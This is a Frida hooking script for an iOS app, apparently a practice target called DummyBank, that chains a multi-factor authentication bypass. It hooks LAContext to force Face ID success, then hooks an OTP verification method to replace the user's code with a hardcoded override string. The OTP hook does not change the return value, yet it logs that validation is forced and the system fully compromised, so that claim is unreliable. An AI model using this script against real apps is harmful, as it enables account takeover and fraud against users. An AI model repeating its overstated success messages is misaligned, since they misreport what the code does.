/**
 * Sentinel Hook - Phase 10.2 (MFA Chain Bypass)
 * Target: Chaining LAContext (FaceID) -> MFAAuthManager (OTP)
 * Execution: Automatically defeats the Biometric gate, then intercepts the OTP verification.
 */

if (ObjC.available) {
    console.log("[🌟] SENTINEL SUBSYSTEM: Initiating MFA Chain Override (Phase 10.2)");
    
    // STEP 1: Biometric Engine Hook (Re-used from Phase 2.1)
    var LAContext = ObjC.classes.LAContext;
    try {
        Interceptor.attach(LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
            onEnter: function (args) {
                this.replyBlock = args[4];
            },
            onLeave: function (retval) {
                if (!this.replyBlock.isNull()) {
                    var block = new ObjC.Block(this.replyBlock);
                    try {
                        block.implementation(1, null);
                        console.log("[+] CHAIN LINK 1 (Biometric): ACCESS GRANTED.");
                    } catch (e) {}
                }
            }
        });
    } catch(err) {
        console.log("[-] ERROR: Chain Link 1 failed - " + err.message);
    }
    
    // STEP 2: OTP / SMS Engine Hook
    var targetMFA = "_TtC9DummyBank14MFAAuthManager";
    try {
        var AppMFAManager = ObjC.classes[targetMFA];
        if (AppMFAManager) {
            console.log("[+] TARGET LOCKED: " + targetMFA + " mapped in memory. Waiting for OTP trigger...");
            
            // Hook the generic verifyOTP method
            Interceptor.attach(AppMFAManager["- verifyOTPWithCode:"].implementation, {
                onEnter: function(args) {
                    console.log("\n[💥] SENTINEL MFA LINK: Intercepting OTP validation...");
                    console.log("    -> Action: Injecting Sentinel God-Key ('SENTINEL_OVERRIDE')");
                    
                    // Replace the user's input with our hardcoded logic override
                    var godKey = ObjC.classes.NSString.stringWithString_("SENTINEL_OVERRIDE");
                    args[2] = godKey; // args[0] = self, args[1] = selector, args[2] = code
                },
                onLeave: function(retval) {
                    console.log("[✅] CHAIN LINK 2 (OTP): VALIDATION FORCED. SYSTEM FULLY COMPROMISED.");
                }
            });
        }
    } catch (err) {
         console.log("[-] FATAL: Failed to hook MFA subsystem - " + err.message);
    }
} else {
    console.log("[-] FATAL: Objective-C Runtime unavailable.");
}
